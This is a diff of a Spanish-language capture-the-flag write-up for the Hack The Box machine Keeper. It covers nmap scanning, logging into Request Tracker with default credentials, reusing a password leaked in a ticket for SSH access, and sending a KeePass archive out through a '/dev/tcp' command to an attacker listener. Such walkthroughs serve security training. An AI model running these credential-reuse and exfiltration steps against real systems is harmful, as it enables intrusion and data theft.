@@ -21,9 +21,9 @@ Keeper es una máquina Linux de nivel de dificultad fácil que cuenta con un sis
 
 ***
 
+## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>
 
-
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Keeper**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.227 -oG allPorts
@@ -47,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 24.60 seconds
            Raw packets sent: 67149 (2.955MB) | Rcvd: 67165 (2.688MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -60,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 24.60 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abiertos el servicio SSH y una página web de `Nginz`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.227 -A -oN targeted -oX targetedXML
@@ -93,7 +93,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -102,38 +102,50 @@ Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
 
+## Initial Access
 
+### Using default credentials to Request Tracker access
+
+Al acceder a http://10.10.11.227, se nos indica que para contactar con el soporte técnico, debemos dirigirnos a [http://tickets.keeper.htb/rt/](http://tickets.keeper.htb/rt/)
 
 <figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
 
+Añadiremos en nuestro archivo `/etc/hosts` las entradas correspondientes.
+
 ```bash
-❯ catnp /etc/hosts | grep 10.10.11.227
+❯ cat /etc/hosts | grep 10.10.11.227
 10.10.11.227 keeper.htb tickets.keeper.htb
 ```
 
-
+Al acceder a[ http://tickets.keeper.htb/rt/](http://tickets.keeper.htb/rt/) nos encontramos con el siguiente panel de inicio de sesión en el cual podemos comprobar arriba a la derecha que se trata de un software llamado `Request Tracker`. Probamos las típicas contraseñas por defecto sin éxito.
 
 <figure><img src="../../.gitbook/assets/4151_vmware_iR49KbNSGt.png" alt=""><figcaption></figcaption></figure>
 
+Al realizar una búsqueda por Internet, nos encontramos cuales son las credenciales que utiliza esta aplicación por defecto.
+
 <figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>
 
-
+Probamos de ingresar con las credenciales `root/password` y verificamos que logramos acceder sin problemas al panel de administración.
 
 <figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
 
+### Information Leakage
 
+Al navegar por las diferentes opciones del sitio web, nos encontramos con una página en donde aparecen usuarios. Probaremos de acceder al usuario llamado `lnorgaard`.
 
 <figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>
 
+Verificamos que en el usuario en la sección de comentarios nos aparecen unas credenciales por defecto, probaremos si aún siguen siendo válidas para este usuario.&#x20;
 
+Además, podemos comprobar que en el nombre real en la otra 'o' está puesta como otro carácter distinto. Por otro lado, en la sección de `Extra info` también notamos lo mismo en algunos carácteres, parece que está en otro idioma.
 
 <figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
 
-
+Validaremos a través de `nxc`si las credenciales son válidas para conectarnos mediante SSH, comprobamos que podemos acceder y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ nxc ssh 10.10.11.227 -u 'lnorgaard' -p 'Welcome2023!'
@@ -153,7 +165,11 @@ lnorgaard@keeper:~$ cat user.txt
 fab90a2de***********************
 ```
 
+## Privilege Escalation
 
+### Transfer a file with /dev/tcp method
+
+Revisando el directorio en el que nos encontramos, visualizamos un archivo llamado `RT30000.zip`.
 
 ```bash
 lnorgaard@keeper:~$ ls -l
@@ -161,28 +177,30 @@ total 85348
 -rw-r--r-- 1 root root      87391651 Jan 26 14:18 RT30000.zip
 ```
 
+Nos pasaremos este archivo a nuestro equipo local para trabajar con él y comprobar el contenido de este. Para ello, desde nuestro equipo de atacnate nos pondremos en escucha con `nc` para recibir por el puerto `443` el archivo mencionado.
 
-
-```
+```bash
 ❯ nc -nlvp 443 > RT30000.zip
 listening on [any] 443 ...
 ```
 
-
+Desde el equipo víctima, enviaremos el contenido del `.zip` realizando un `cat` sobre el archivo y enviando el `output` al `/dev/tcp` de nuestra dirección y puerto donde estamos en escucha.
 
 ```bash
 lnorgaard@keeper:~$ cat RT30000.zip > /dev/tcp/10.10.16.5/443
 ```
 
-
+Verificaremos que hemos recibido correctamente el archivo original sin problemas. Descomprimiremos el archivo y visualiozaremos que nos encontramos con un archivo `.DMP` que se trata de un `Memory Dump` y también una base de datos de contraseñas de **KeepPass**.
 
 ```bash
 ❯ ls -l RT30000.zip
 .rw-rw-r-- kali kali 83 MB Sun Jan 26 14:20:46 2025  RT30000.zip
+
 ❯ unzip RT30000.zip
 Archive:  RT30000.zip
   inflating: KeePassDumpFull.dmp     
- extracting: passcodes.kdbx          
+ extracting: passcodes.kdbx
+           
 ❯ tree
 .
 ├── KeePassDumpFull.dmp
@@ -196,13 +214,17 @@ Archive:  RT30000.zip
 
 
 
-```
+```bash
 ❯ keepassxc passcodes.kdbx & disown
 ```
 
 
 
 <figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>
+
+
+
+### Obtaining KeePass password through memory dump
 
 
 
@@ -304,6 +326,8 @@ SSH         10.10.11.227    22     10.10.11.227     [-] root:F4><3K0nd!
 
 
 
+
+### Converting PPK Key V3 to SSH Private Key (id\_rsa)
 
 
 
